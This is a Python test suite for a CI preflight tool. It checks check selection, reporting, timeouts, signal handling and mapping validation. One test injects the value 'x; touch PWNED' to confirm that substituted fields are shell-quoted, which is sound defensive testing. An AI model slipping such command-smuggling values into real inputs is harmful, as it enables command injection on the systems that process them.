    for cmd in (["init", "-q"], ["-c", "user.email=t@t", "-c", "user.name=t", "commit", "-q", "--allow-empty", "-m", "x"]):
        subprocess.run(["git", *cmd], cwd=root, check=True)
    mapping = tmp_path / "checks.json"
    mapping.write_text(json.dumps({"checks": checks}))
    return ["--root", str(root), "--mapping", str(mapping)]


def _check(id_, command, **kw):
    return {"id": id_, "paths": ["a/**"], "command": command, "mirrors": [], "cost": "fast", **kw}


def test_exit_codes(tmp_path, capsys):
    args = _repo(tmp_path, [_check("ok", "true"), _check("bad", "echo boom; exit 3"),
                            _check("away", "true", needs={"os": "plan9"}), _check("big", "false", cost="slow")])
    assert pf.main(args + ["--paths", "b/x"]) == 0                                     # nothing selected
    assert "No CI check" in capsys.readouterr().out
    assert pf.main(args + ["--paths", "a/x", "--only", "ok"]) == 0
    capsys.readouterr()
    assert pf.main(args + ["--paths", "a/x"]) == 1
    out = capsys.readouterr().out
    for expected in (r"ok +passed", r"bad +failed: exit 3", r"\| boom", r"away +not run: CI runs this on Plan9",
                     r"big +skipped: slow"):
        assert re.search(expected, out), expected
    assert pf.main(args + ["--paths", "a/x", "--list"]) == 0                           # lists, runs nothing
    assert "would run" in capsys.readouterr().out
    assert pf.main(args + ["--paths", "a/x", "--only", "nope"]) == 2


def test_json_report_never_counts_not_run_as_passed(tmp_path, capsys):
    args = _repo(tmp_path, [_check("ok", "true"), _check("away", "true", needs={"os": "plan9"})])
    assert pf.main(args + ["--paths", "a/x", "--json"]) == 3                   # incomplete, not passed
    report = json.loads(capsys.readouterr().out)
    assert {c["id"]: c["status"] for c in report["checks"]} == {"ok": "passed", "away": "not run"}
    assert report["verdict"] == "incomplete" and [n["id"] for n in report["not_run"]] == ["away"]
    assert report["paths"] == ["a/x"] and "evidence" in report["limits"]
    assert pf.main(args + ["--paths", "a/x", "--json", "--only", "ok"]) == 0
    assert json.loads(capsys.readouterr().out)["verdict"] == "passed"


def test_a_ci_only_step_is_reported_never_run_and_left_out_of_the_verdict(tmp_path, capsys):
    """The SCADA recapture (#763) runs in CI only after the provenance step failed and rewrites generated files."""
    planted = tmp_path / "ran"
    args = _repo(tmp_path, [_check("ok", "true"), _check("repair", f"touch {planted}", ci_only="after a failure")])
    assert pf.main(args + ["--paths", "a/x", "--json"]) == 0
    report = json.loads(capsys.readouterr().out)
    assert {c["id"]: c["status"] for c in report["checks"]} == {"ok": "passed", "repair": "ci only"}
    assert report["verdict"] == "passed" and report["ci_only"] == [{"id": "repair", "reason": "after a failure"}]
    assert pf.main(args + ["--paths", "a/x", "--only", "repair"]) == 0               # named: still not run
    out = capsys.readouterr().out
    assert re.search(r"repair +ci only: after a failure", out) and "Verdict: nothing selected" in out
    assert "1 check(s) selected, 1 of them CI only (never run here, not in the verdict)" in out
    assert not planted.exists(), "a ci_only command must never run here"


def step_conditions(flows: dict[str, dict]) -> dict[tuple, list[str]]:
    """``(workflow, job, cwd, command)`` -> the ``if:`` of every step that runs it."""
    out: dict[tuple, list[str]] = {}
    for name, doc in flows.items():
        for job_id, job in (doc.get("jobs") or {}).items():
            default_cwd = ((job.get("defaults") or {}).get("run") or {}).get("working-directory", ".")
            for step in job.get("steps") or []:
                if "run" in step:
                    for seg in segments(step["run"]):
                        key = (name, job_id, step.get("working-directory", default_cwd), seg)
                        out.setdefault(key, []).append(str(step.get("if", "")))
    return out


def ci_only_problems(flows: dict[str, dict], mapping: dict) -> list[str]:
    """A ``ci_only`` entry stands for a repair step CI runs after a failure: each step it mirrors must say so in its
    ``if:`` (``failure()``), or an ordinary check could be marked ci_only and silently never run here."""
    conditions, out = step_conditions(flows), []
    for c in mapping["checks"]:
        if "ci_only" not in c:
            continue
        if not str(c["ci_only"]).strip():
            out.append(f"{c['id']}: ci_only gives no reason")
        for m in c["mirrors"]:
            key = (m["workflow"], m["job"], m.get("cwd", c.get("cwd", ".")), " ".join(m["run"].split()))
            ifs = conditions.get(key, [])
            if not ifs or not all(requires(i, AFTER_FAILURE) for i in ifs):
                out.append(f"{c['id']}: {' / '.join(key)} runs without `failure()` as a required `&&` term of its "
                           f"`if:` ({ifs}); a ci_only entry may mirror only a step CI runs after a failure")
    return out


def test_ci_only_entries_mirror_only_steps_that_run_after_a_failure(mapping):
    assert any("ci_only" in c for c in mapping["checks"]), "the guard has nothing to read"
    assert not ci_only_problems(pr_workflows(), mapping)


def test_an_ordinary_step_marked_ci_only_fails(mapping):
    marked = json.loads(json.dumps(mapping))
    fea = next(c for c in marked["checks"] if c["id"] == "fea")
    fea["ci_only"] = "pretend this is a repair step"
    problems = ci_only_problems(pr_workflows(), marked)
    assert len(problems) == 1 and problems[0].startswith("fea: webkit.yml / browser / tools/site / npm run test:fea")


@pytest.mark.parametrize("reason", ["", "   ", "\t\n"])
def test_a_blank_ci_only_reason_is_refused(mapping, tmp_path, capsys, reason):
    marked = json.loads(json.dumps(mapping))
    next(c for c in marked["checks"] if c["id"] == "scada-recapture")["ci_only"] = reason
    assert any("scada-recapture: ci_only gives no reason" == p for p in ci_only_problems(pr_workflows(), marked))
    assert any("ci_only must give the reason" in p for p in pf.mapping_problems(marked))
    args = _repo(tmp_path, [_check("repair", "true", ci_only=reason)])
    assert pf.main(args + ["--paths", "a/x"]) == 2
    assert "ci_only must give the reason" in capsys.readouterr().err


def test_editing_a_workflow_selects_what_it_runs(mapping):
    """#766 re-review: an edit to webkit.yml selected no webkit or scada entry. A workflow file selects every entry
    that mirrors one of its steps; a ci.yml edit selects none of webkit.yml's."""
    def ids(path):
        return {i.check["id"] for i in pf.select(mapping, [path])}
    webkit = {c["id"] for c in mapping["checks"] if any(m["workflow"] == "webkit.yml" for m in c["mirrors"])}
    ci = {c["id"] for c in mapping["checks"] if any(m["workflow"] == "ci.yml" for m in c["mirrors"])}
    ci.discard("pytest-domain")                     # per_match: a workflow path gives it no domain
    assert {"fea", "scada-unit", "model-touch", "scada-recapture"} <= webkit <= ids(".github/workflows/webkit.yml")
    assert ci <= ids(".github/workflows/ci.yml") and "fea" not in ids(".github/workflows/ci.yml")
    assert "mermaid-provenance" in ids(".github/workflows/ci.yml")


def test_the_merged_webkit_steps_select_their_entries(mapping):
    """#749's model-explode suite and #763's recapture step, from the files they touch."""
    ids = {i.id for i in pf.select(mapping, ["tests/webkit/webkit-model-explode-browser.mjs"])}
    assert {"model-explode[chromium]", "model-explode[webkit]"} <= ids and "model-touch[chromium]" not in ids
    ids = {i.id for i in pf.select(mapping, ["tests/webkit/webkit-model-touch-browser.mjs"])}
    assert {"model-touch[chromium]", "model-touch[webkit]"} <= ids and "model-explode[chromium]" not in ids
    ids = {i.check["id"] for i in pf.select(mapping, ["tools/webkit/scada/recapture.py"])}
    assert "scada-recapture" in ids and "model-explode" not in ids
    recapture = next(c for c in mapping["checks"] if c["id"] == "scada-recapture")
    assert recapture["ci_only"]


def test_a_selected_check_that_did_not_run_is_listed_at_the_end(tmp_path, capsys):
    """#766: a slow site browser check was selected, reported as skipped among many lines, and missed. The report now
    ends with every selected check that did not run and why, and the exit status says the run was incomplete."""
    args = _repo(tmp_path, [_check("ok", "true"), _check("browser", "true", cost="slow", cost_note="whole site",
                                                          title="The built site in a browser: diagram widths")])
    assert pf.main(args + ["--paths", "a/x"]) == 3
    tail = capsys.readouterr().out.splitlines()[-4:]
    assert tail == ["1 of 1 checks that ran here passed.",
                    "Not run, so not passed (CI runs them): 1 skipped as slow (--slow runs them), 0 cannot run here:",
                    "  - skipped: browser (The built site in a browser: diagram widths): slow (whole site); --slow runs it",
                    "Verdict: incomplete"]
    assert pf.main(args + ["--paths", "a/x", "--slow"]) == 0
    assert capsys.readouterr().out.splitlines()[-1] == "Verdict: passed"


def test_skipped_and_cannot_run_are_told_apart(tmp_path, capsys):
    args = _repo(tmp_path, [_check("ok", "true"), _check("big", "true", cost="slow"),
                            _check("away", "true", needs={"os": "plan9"})])
    assert pf.main(args + ["--paths", "a/x", "--json"]) == 3
    report = json.loads(capsys.readouterr().out)
    assert (report["ran"], report["passed"]) == (1, 1)
    assert [x["id"] for x in report["skipped"]] == ["big"] and [x["id"] for x in report["cannot_run"]] == ["away"]
    assert {x["id"] for x in report["not_run"]} == {"big", "away"}


def test_only_runs_a_slow_check_without_slow(tmp_path, capsys):
    args = _repo(tmp_path, [_check("big", "true", cost="slow")])
    assert pf.main(args + ["--paths", "a/x", "--only", "big"]) == 0
    assert "Verdict: passed" in capsys.readouterr().out


def test_diff_base_and_uncommitted_paths(tmp_path, capsys):
    args = _repo(tmp_path, [_check("ok", "true")])
    root = Path(args[1])
    subprocess.run(["git", "branch", "-q", "base"], cwd=root, check=True)
    (root / "a").mkdir()
    (root / "a" / "committed.txt").write_text("1")
    subprocess.run(["git", "add", "."], cwd=root, check=True)
    subprocess.run(["git", "-c", "user.email=t@t", "-c", "user.name=t", "commit", "-q", "-m", "y"], cwd=root, check=True)
    (root / "a" / "new.txt").write_text("2")
    assert pf.main(args + ["--base", "base", "--json", "--list"]) == 0
    assert json.loads(capsys.readouterr().out)["paths"] == ["a/committed.txt", "a/new.txt"]
    assert pf.main(args + ["--base", "base", "--json", "--list", "--committed-only"]) == 0
    assert json.loads(capsys.readouterr().out)["paths"] == ["a/committed.txt"]
    assert pf.main(args + ["--base", "no-such-ref"]) == 2


def test_a_hung_check_is_stopped_and_fails(tmp_path, capsys):
    args = _repo(tmp_path, [_check("hang", "sleep 30 & sleep 30")])
    assert pf.main(args + ["--paths", "a/x", "--timeout", "1", "--json"]) == 1
    (report,) = json.loads(capsys.readouterr().out)["checks"]
    assert report["status"] == "failed" and report["reason"] == "timed out after 1 s" and report["seconds"] < 10


def test_large_output_and_stdin_do_not_block_a_check(tmp_path, capsys):
    """Output goes to a file, not an undrained pipe, and stdin is closed: a check that writes megabytes and reads
    stdin finishes instead of waiting (the site-unit timeout on #766 was the suite's own site builds, not this). It
    fails on purpose, so its log is kept to measure."""
    args = _repo(tmp_path, [_check("chatty", "head -c 3000000 /dev/zero | tr '\\0' x; cat; exit 4")])
    assert pf.main(args + ["--paths", "a/x", "--timeout", "60", "--json"]) == 1
    (report,) = json.loads(capsys.readouterr().out)["checks"]
    assert report["reason"] == "exit 4" and report["seconds"] < 30
    assert Path(report["log"]).stat().st_size >= 3_000_000


def test_logs_are_deleted_when_everything_passed(tmp_path, capsys):
    args = _repo(tmp_path, [_check("ok", "echo hi")])
    assert pf.main(args + ["--paths", "a/x", "--json"]) == 0
    report = json.loads(capsys.readouterr().out)
    assert report["workdir"] is None
    assert not list(Path(tempfile.gettempdir()).glob("cad-agent-preflight-*"))


def test_a_checks_own_timeout_and_heap_need(tmp_path, monkeypatch):
    m = _machine(tmp_path)
    m.node_heap_mb = lambda: 2096
    need = {"node_heap_mb": 4096, "node_heap_why": "big suite"}
    inst = _assess({"id": "x", "command": "c", "needs": need}, m)
    assert inst.status == "runnable" and inst.env["NODE_OPTIONS"].endswith("--max-old-space-size=4096")
    assert any("default Node heap is 2096 MB" in n and "big suite" in n for n in inst.notes)
    m.node_heap_mb = lambda: 4144
    assert "NODE_OPTIONS" not in _assess({"id": "x", "command": "c", "needs": need}, m).env
    seen = []
    monkeypatch.setattr(pf, "run", lambda inst, ctx, machine, workdir, timeout: seen.append(timeout))
    (tmp_path / "t").mkdir()
    args = _repo(tmp_path / "t", [_check("own", "true", timeout=5400), _check("plain", "true")])
    pf.main(args + ["--paths", "a/x", "--json"])
    pf.main(args + ["--paths", "a/x", "--json", "--timeout", "7"])
    assert seen == [5400, pf.DEFAULT_TIMEOUT, 7, 7]


# ---------------------------------------------------------------------------------------------------------------------
# Review of #766: never "passed" for something that did not run; malformed mappings are setup errors


def test_only_runs_a_named_check_the_paths_do_not_select(tmp_path, capsys):
    args = _repo(tmp_path, [_check("ok", "true"), _check("other", "echo ran", paths=["b/**"])])
    assert pf.main(args + ["--paths", "a/x", "--only", "other", "--json"]) == 0
    report = json.loads(capsys.readouterr().out)
    assert [(c["id"], c["status"]) for c in report["checks"]] == [("other", "passed")]
    assert report["checks"][0]["because"] == ["named with --only; no changed path selects it"]


def test_only_a_per_match_check_without_a_value_is_not_run(tmp_path, capsys):
    args = _repo(tmp_path, [_check("dom", "echo {domain}", per_match=r"^a/(?P<domain>[a-z]+)/")])
    assert pf.main(args + ["--paths", "zzz", "--only", "dom", "--json"]) == 3
    (check,) = json.loads(capsys.readouterr().out)["checks"]
    assert check["status"] == "not run" and "no changed path gives it a value" in check["reason"]


def test_nothing_selected_is_not_called_passed(tmp_path, capsys):
    args = _repo(tmp_path, [_check("ok", "true")])
    assert pf.main(args + ["--paths", "b/x"]) == 0
    out = capsys.readouterr().out
    assert "Verdict: nothing selected" in out and "Verdict: passed" not in out
    assert pf.main(args + ["--paths", "b/x", "--json"]) == 0
    assert json.loads(capsys.readouterr().out)["verdict"] == "nothing selected"


@pytest.mark.parametrize("checks,needle", [
    (None, "no `checks` list"),
    ([{"id": "a", "paths": ["a/**"], "command": "echo ${HOME}", "mirrors": []}], "names {HOME}"),
    ([{"id": "a", "paths": ["a/**"], "command": "echo {", "mirrors": []}], "stray brace"),
    ([{"id": "a", "paths": ["a/**"], "command": "x", "per_match": "^(?P<d>[a-z]+", "mirrors": []}], "not a regex"),
    ([{"id": "a", "paths": ["a/**"], "command": "echo {d}", "per_match": "^(?P<d>.*)$", "mirrors": []}],
     "plain classes"),
    ([{"id": "a", "paths": ["a/**"], "mirrors": []}], "no `command`"),
])
def test_a_malformed_mapping_exits_2_with_a_message(tmp_path, capsys, checks, needle):
    args = _repo(tmp_path, [])
    Path(args[3]).write_text(json.dumps({} if checks is None else {"checks": checks}))
    assert pf.main(args + ["--paths", "a/x"]) == 2
    assert needle in capsys.readouterr().err


def test_per_match_values_are_shell_quoted(tmp_path):
    inst = pf.Instance({"id": "d", "command": "echo {d}"}, subs={"d": "x; touch PWNED"})
    assert inst.command({}) == "echo 'x; touch PWNED'"


def test_a_pass_on_another_runtime_is_counted_and_flagged(tmp_path, capsys, monkeypatch):
    args = _repo(tmp_path, [_check("same", "true"), _check("other", "node -e 1", needs={"python": {"version": "3.12"}})])
    monkeypatch.setattr(pf.Machine, "choose_python",
                        lambda self, need, pp: ("/py313", {"version": "3.13.0", "prefix": "/p"}, ""))
    monkeypatch.setattr(pf.Machine, "node_major", lambda self: "20")
    mapping = json.loads(Path(args[3]).read_text())
    mapping["ci_node_major"] = "22"
    Path(args[3]).write_text(json.dumps(mapping))
    assert pf.main(args + ["--paths", "a/x"]) == 0
    out = capsys.readouterr().out
    assert "1 ran on a different browser, Python or Node than CI's (evidence, not CI's result): other (python/node)" in out
    assert "runs on Node 20, CI pins 22" in out
    assert pf.main(args + ["--paths", "a/x", "--json"]) == 0
    report = json.loads(capsys.readouterr().out)
    assert {c["id"]: c["differs"] for c in report["checks"]} == {"same": [], "other": ["python", "node"]}
    assert report["differs"] == [{"id": "other", "differs": ["python", "node"]}]


def test_ctrl_c_stops_the_running_check_and_its_children(tmp_path, capsys, monkeypatch):
    marker = tmp_path / "child.pid"
    args = _repo(tmp_path, [_check("long", f"sleep 60 & echo $! > {marker}; wait")])
    real_wait, calls = subprocess.Popen.wait, []

    def interrupted(self, timeout=None):
        if not calls and self.args[:2] == ["/bin/sh", "-c"]:                # the check, not git or a probe
            calls.append(1)
            for _ in range(100):
                if marker.exists() and marker.read_text().strip():
                    break
                time.sleep(0.05)
            raise KeyboardInterrupt
        return real_wait(self, timeout=timeout)

    monkeypatch.setattr(subprocess.Popen, "wait", interrupted)
    assert pf.main(args + ["--paths", "a/x"]) == 130
    captured = capsys.readouterr()
    assert "interrupted (SIGINT); stopped the running check" in captured.err
    assert "long  failed: interrupted (SIGINT)" in captured.out and "Verdict: interrupted (SIGINT)" in captured.out
    child = int(marker.read_text())
    time.sleep(0.2)
    status = Path(f"/proc/{child}/status")
    state = re.search(r"^State:\s+(\S)", status.read_text(), re.M).group(1) if status.exists() else "gone"
    assert state in {"gone", "Z", "X"}, f"the check's child {child} still runs ({state})"   # killed; maybe unreaped


# ---------------------------------------------------------------------------------------------------------------------
# Re-review of #766: wrong types, quoted placeholders, real signals, another Chromium


@pytest.mark.parametrize("field,value,needle", [
    ("env", "x", "`env` must be a dict"), ("needs", "x", "`needs` must be a dict"),
    ("paths", "**", "`paths` must be a list"), ("command", ["true"], "`command` must be a str"),
    ("cwd", "nope", "cwd nope is not a folder"), ("timeout", "x", "`timeout` must be a int"),
    ("needs", {"python": "3.12"}, "`python` must be a dict"), ("needs", {"node_deps": [1]}, "list of strings"),
    ("engines", ["firefox"], "is not chromium or webkit"), ("color", "red", "unknown field `color`"),
])
def test_a_wrong_typed_field_exits_2_with_a_message(tmp_path, capsys, field, value, needle):
    args = _repo(tmp_path, [{**_check("a", "true"), field: value}])
    assert pf.main(args + ["--paths", "a/x"]) == 2
    assert needle in capsys.readouterr().err
    assert not list(Path(tempfile.gettempdir()).glob("cad-agent-preflight-*")), "no run folder left behind"


@pytest.mark.parametrize("per_match,command,needle", [
    (r"^a/(?P<d>[0-z]+)/", "echo {d}", "must be one of the plain classes"),
    (r"^a/(?P<d>[a-z]+)/", 'echo "{d}"', "inside quotes"),
    (r"^a/(?P<d>[a-z]+)/", "echo '{d}'", "inside quotes"),
])
def test_unsafe_per_match_shapes_are_refused(tmp_path, capsys, per_match, command, needle):
    args = _repo(tmp_path, [_check("a", command, per_match=per_match)])
    assert pf.main(args + ["--paths", "a/x"]) == 2
    assert needle in capsys.readouterr().err


def test_an_unexpected_error_is_exit_2(tmp_path, capsys, monkeypatch):
    args = _repo(tmp_path, [_check("a", "true")])
    monkeypatch.setattr(pf, "select", lambda *a: 1 / 0)
    assert pf.main(args + ["--paths", "a/x"]) == 2
    assert "setup error: ZeroDivisionError" in capsys.readouterr().err


@pytest.mark.parametrize("sig,code", [(signal.SIGTERM, 143), (signal.SIGHUP, 129), (signal.SIGINT, 130)])
def test_a_real_signal_stops_the_check_group_and_still_reports(tmp_path, sig, code):
    """Sent for real to a separate preflight process, as a harness timeout would: the check's shell and its
    background child are gone, the exit code names the signal, and --json still prints the finished checks."""
    marker = tmp_path / "child.pid"
    args = _repo(tmp_path, [_check("first", "true"), _check("long", f"sleep 60 & echo $! > {marker}; wait"),
                            _check("never", "true")])
    env = {**os.environ, "TMPDIR": str(tmp_path / "system-temp")}
    proc = subprocess.Popen([sys.executable, str(ROOT / "tools/ci/preflight.py"), *args, "--paths", "a/x", "--json"],
                            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, env=env)
    for _ in range(200):
        if marker.exists() and marker.read_text().strip():
            break
        time.sleep(0.05)
    child = int(marker.read_text())
    proc.send_signal(sig)
    out, err = proc.communicate(timeout=30)
    assert proc.returncode == code, err
    report = json.loads(out)
    name = signal.Signals(sig).name
    assert report["verdict"] == f"interrupted ({name})"
    assert {c["id"]: c["status"] for c in report["checks"]} == {"first": "passed", "long": "failed", "never": "not run"}
    time.sleep(0.2)
    status = Path(f"/proc/{child}/status")
    state = re.search(r"^State:\s+(\S)", status.read_text(), re.M).group(1) if status.exists() else "gone"
    assert state in {"gone", "Z", "X"}, f"the check's child {child} still runs ({state})"


def test_stop_group_tolerates_a_group_that_has_gone():
    proc = subprocess.Popen(["true"], start_new_session=True)
    proc.wait()
    pf.stop_group(proc.pid)                                            # no ProcessLookupError


def test_another_chromium_on_path_is_flagged(tmp_path):
    pw = tmp_path / "pw" / "browsers.json"
    pw.parent.mkdir()
    pw.write_text(json.dumps({"browsers": [{"name": "chromium-headless-shell", "revision": "1234"}]}))
    bindir = tmp_path / "bin"
    bindir.mkdir()
    (bindir / "chromium").write_text("#!/bin/sh\n")
    (bindir / "chromium").chmod(0o755)
    m = _machine(tmp_path / "m")
    m.env["PATH"] = str(bindir)
    m.probe = lambda exe, modules, dists, pythonpath: {"version": "3.12.1", "prefix": "/p", "modules": {},
                                                       "dists": {}, "playwright": str(pw)}
    m.python_candidates = lambda: ["/py312"]
    inst = _assess({"id": "x", "command": "c", "needs": {"python": {"version": "3.12", "browser": "chromium"}}}, m)
    assert inst.status == "runnable" and inst.differs == ["browser"]
    assert any("`chromium` on PATH" in n and "r1234" in n for n in inst.notes)


def test_dispatch_only_means_equal_and_inert_cannot_hide_a_subshell(mapping):
    steps = [{"name": "Not manual", "if": "github.event_name != 'workflow_dispatch'", "run": "npm run test:new"},
             {"name": "Manual", "if": "github.event_name == 'workflow_dispatch' && inputs.x", "run": "npm run test:new"},
             {"name": "Echo", "run": 'echo "$(npx playwright test)"'},
             {"name": "If", "run": 'if [ "$(npm run secret)" = 1 ]; then true; fi'},
             {"name": "Tee", "run": "tee >(bash check.sh)"},
             {"name": "Tick", "run": "echo `make test`"}]
    flows = {"webkit.yml": {"on": {"pull_request": None}, "jobs": {"browser": {"steps": steps}}}}
    unmapped, unclassified, _, _ = audit(flows, mapping)
    named_steps = {m.split(" / ")[2].split(":")[0] for m in unmapped + unclassified}
    assert named_steps == {"Not manual", "Echo", "If", "Tee", "Tick"}


# ---------------------------------------------------------------------------------------------------------------------
# Follow-ups from the reviews of #766 (#767)


def test_a_relative_workdir_is_made_absolute(tmp_path, capsys, monkeypatch):
    """Python 3.10 and 3.11's mkdtemp returns a relative path for a relative ``dir``; the run folder (and the Python
    shim's PATH entry under it) must still be absolute, or it resolves against each check's own cwd."""
    real = tempfile.mkdtemp

    def mkdtemp_311(prefix=None, dir=None):                       # the 3.11 behaviour, on any Python
        made = real(prefix=prefix, dir=dir)
        return os.path.relpath(made) if dir is not None and not os.path.isabs(dir) else made

    monkeypatch.setattr(tempfile, "mkdtemp", mkdtemp_311)
    args = _repo(tmp_path, [_check("bad", "echo {tmp}; exit 1")])
    monkeypatch.chdir(tmp_path)
    assert pf.main(args + ["--paths", "a/x", "--json", "--workdir", "runs"]) == 1
    report = json.loads(capsys.readouterr().out)
    assert os.path.isabs(report["workdir"]) and report["workdir"].startswith(str(tmp_path / "runs"))
    assert report["checks"][0]["command"].startswith(f"echo {tmp_path / 'runs'}")


def test_parents_made_for_the_workdir_go_after_a_passing_run(tmp_path, capsys):
    args = _repo(tmp_path, [_check("ok", "true"), _check("bad", "exit 1", paths=["b/**"])])
    assert pf.main(args + ["--paths", "a/x", "--workdir", str(tmp_path / "p" / "q" / "r")]) == 0
    assert not (tmp_path / "p").exists(), "the folders --workdir made are removed when nothing is kept"
    (tmp_path / "mine").mkdir()
    assert pf.main(args + ["--paths", "a/x", "--workdir", str(tmp_path / "mine" / "q")]) == 0
    assert (tmp_path / "mine").is_dir(), "a folder that already existed stays"
    assert pf.main(args + ["--paths", "b/x", "--workdir", str(tmp_path / "p" / "q")]) == 1
    assert len(list((tmp_path / "p" / "q").glob("cad-agent-preflight-*"))) == 1, "a failed run keeps its logs"
    capsys.readouterr()


def test_a_path_chromium_is_flagged_even_with_the_pinned_build_installed(tmp_path):
    """The capture scripts default ``--chromium`` to ``shutil.which('chromium')``: a PATH browser wins over the
    pinned build whenever there is one."""
    pw = tmp_path / "pw" / "browsers.json"
    pw.parent.mkdir()
    pw.write_text(json.dumps({"browsers": [{"name": "chromium-headless-shell", "revision": "1234"}]}))
    bindir = tmp_path / "bin"
    bindir.mkdir()
    (bindir / "chromium").write_text("#!/bin/sh\n")
    (bindir / "chromium").chmod(0o755)
    m = _machine(tmp_path / "m", browsers=["chromium_headless_shell-1234"])
    m.probe = lambda exe, modules, dists, pythonpath: {"version": "3.12.1", "prefix": "/p", "modules": {},
                                                       "dists": {}, "playwright": str(pw)}
    m.python_candidates = lambda: ["/py312"]
    check = {"id": "x", "command": "c", "needs": {"python": {"version": "3.12", "browser": "chromium"}}}
    m.env["PATH"] = str(bindir)
    inst = _assess(check, m)
    assert inst.status == "runnable" and inst.differs == ["browser"]
    assert any("`chromium` on PATH" in n and str(bindir / "chromium") in n for n in inst.notes)
    m.env["PATH"] = "/nonexistent"
    inst = _assess(check, m)
    assert inst.status == "runnable" and inst.differs == [] and not inst.notes


@pytest.mark.parametrize("mirrors,dists,needle", [
    (["x"], None, "mirror 1 must be an object"),
    ([{}], None, "mirror 1 has no `workflow`"),
    ([{"workflow": "ci.yml", "job": "j"}], None, "mirror 1 has no `run`"),
    ([{"workflow": "ci.yml", "job": "j", "run": 3}], None, "mirror 1: `run` must be a str"),
    ([{"workflow": "ci.yml", "job": "j", "run": "x", "colour": "red"}], None, "unknown field `colour`"),
    ([], ["optuna"], "`optuna` must be name==version"),
    ([], ["optuna=="], "`optuna==` must be name==version"),
])
def test_malformed_mirrors_and_dist_pins_are_setup_errors(tmp_path, capsys, mirrors, dists, needle):
    """Each reached the catch-all and left the run folder; ``mirrors: [{}]`` with ``--json`` did so after the checks
    had run, losing their results."""
    ran = tmp_path / "ran"
    check = _check("a", f"touch {ran}", mirrors=mirrors)
    if dists is not None:
        check["needs"] = {"python": {"dists": dists}}
    args = _repo(tmp_path, [check])
    assert pf.main(args + ["--paths", "a/x", "--json"]) == 2
    err = capsys.readouterr().err
    assert "is malformed" in err and needle in err, err
    assert not ran.exists(), "nothing runs on a malformed mapping"
    assert not list(Path(tempfile.gettempdir()).glob("cad-agent-preflight-*")), "no run folder left behind"


@pytest.mark.parametrize("cwd", ["..", "../repo/..", "/tmp", "out"])
def test_a_cwd_outside_the_checkout_is_refused(tmp_path, capsys, cwd):
    args = _repo(tmp_path, [_check("a", "true", cwd=cwd)])
    (tmp_path / "elsewhere").mkdir()
    (Path(args[1]) / "out").symlink_to(tmp_path / "elsewhere")
    assert pf.main(args + ["--paths", "a/x"]) == 2
    assert f"cwd {cwd} is outside the checkout" in capsys.readouterr().err


def test_a_cwd_inside_the_checkout_still_works(tmp_path, capsys):
    args = _repo(tmp_path, [_check("a", "test -f marker", cwd="sub/dir")])
    (Path(args[1]) / "sub" / "dir").mkdir(parents=True)
    (Path(args[1]) / "sub" / "dir" / "marker").write_text("")
    assert pf.main(args + ["--paths", "a/x"]) == 0
    capsys.readouterr()


@pytest.mark.parametrize("command,refused", [
    ('echo "{d:}"', True),
    ('echo "{d!s}"', True),
    ("echo '{d!r:>4}'", True),
    ('echo "a\\" {d}"', True),           # the \" does not close the quotes: {d} is still inside them
    ('echo \\" {d} \\"', False),         # escaped quotes outside quotes open nothing
    ("echo '{{' {d} '}}'", False),       # literal braces in quotes; {d} itself is bare
    ("echo {d}", False),
])
def test_quoted_fields_reads_the_shell_and_the_format_syntax(command, refused):
    check = _check("a", command, per_match=r"^a/(?P<d>[a-z]+)/")
    assert any("inside quotes" in p for p in pf.mapping_problems({"checks": [check]})) is refused, command


@pytest.mark.parametrize("top,needle", [
    ({"ci_node_major": 22}, "`ci_node_major` must be a str"),
    ({"ci_node_major": "v22"}, "`ci_node_major` must be a Node major"),
    ({"about": ["x"]}, "`about` must be a str"),
    ({"colour": "red"}, "unknown top-level field `colour`"),
])
def test_top_level_keys_are_typed(tmp_path, capsys, top, needle):
    """``ci_node_major`` as the integer 22 never equals node's "22" and flagged every Node check as differing."""
    args = _repo(tmp_path, [_check("a", "true")])
    Path(args[3]).write_text(json.dumps({"checks": [_check("a", "true")], **top}))
    assert pf.main(args + ["--paths", "a/x"]) == 2
    assert needle in capsys.readouterr().err


def _send_when(marker: Path, *sigs):
    """Send each of ``sigs`` to this process once ``marker`` holds the check's child pid."""
    import threading

    def go():
        for _ in range(400):
            if marker.exists() and marker.read_text().strip():
                break
            time.sleep(0.025)
        for s in sigs:
            os.kill(os.getpid(), s)

    t = threading.Thread(target=go, daemon=True)
    t.start()
    return t


def test_a_signal_after_the_last_check_still_reports(tmp_path, capsys, monkeypatch):
    """A real SIGTERM while the report is being written: the checks all finished, so the report is printed in full,
    the exit status still names the signal, and the message does not say no check ran."""
    args = _repo(tmp_path, [_check("ok", "true")])
    real = pf.text_report

    def report_then_signal(*a, **kw):
        os.kill(os.getpid(), signal.SIGTERM)                        # handled at the next bytecode
        return real(*a, **kw)

    monkeypatch.setattr(pf, "text_report", report_then_signal)
    assert pf.main(args + ["--paths", "a/x"]) == 143
    out, err = capsys.readouterr()
    assert re.search(r"ok +passed", out) and "Verdict: passed" in out, out
    assert "before any check" not in err and "after the checks finished" in err, err


def test_a_second_signal_while_stopping_does_not_unreport_the_running_check(tmp_path, capsys, monkeypatch):
    """Two real SIGTERMs close together: the second lands while the first is stopping the check's group. The check
    is reported as interrupted (failed), never as "not run ... before it ran"."""
    marker = tmp_path / "child.pid"
    args = _repo(tmp_path, [_check("long", f"sleep 60 & echo $! > {marker}; wait"), _check("never", "true")])
    real_stop = pf.stop_group

    def stop_after_another_signal(pid):
        os.kill(os.getpid(), signal.SIGTERM)
        real_stop(pid)

    monkeypatch.setattr(pf, "stop_group", stop_after_another_signal)
    _send_when(marker, signal.SIGTERM)
    assert pf.main(args + ["--paths", "a/x", "--json"]) == 143
    report = json.loads(capsys.readouterr().out)
    statuses = {c["id"]: (c["status"], c["reason"]) for c in report["checks"]}
    assert statuses["long"] == ("failed", "interrupted (SIGTERM)"), statuses
    assert statuses["never"][0] == "not run"


def test_checks_an_interrupt_never_reached_are_not_called_cannot_run_here(tmp_path, capsys):
    marker = tmp_path / "child.pid"
    args = _repo(tmp_path, [_check("long", f"sleep 60 & echo $! > {marker}; wait"), _check("never", "true")])
    _send_when(marker, signal.SIGTERM)
    assert pf.main(args + ["--paths", "a/x"]) == 143
    out = capsys.readouterr().out
    assert "cannot run here: never" not in out and "0 cannot run here" in out, out
    assert "  - not reached: never (): the run was interrupted (SIGTERM) before it started" in out, out
    marker.unlink()
    _send_when(marker, signal.SIGTERM)
    assert pf.main(args + ["--paths", "a/x", "--json"]) == 143
    report = json.loads(capsys.readouterr().out)
    assert report["cannot_run"] == [] and [x["id"] for x in report["not_reached"]] == ["never"]
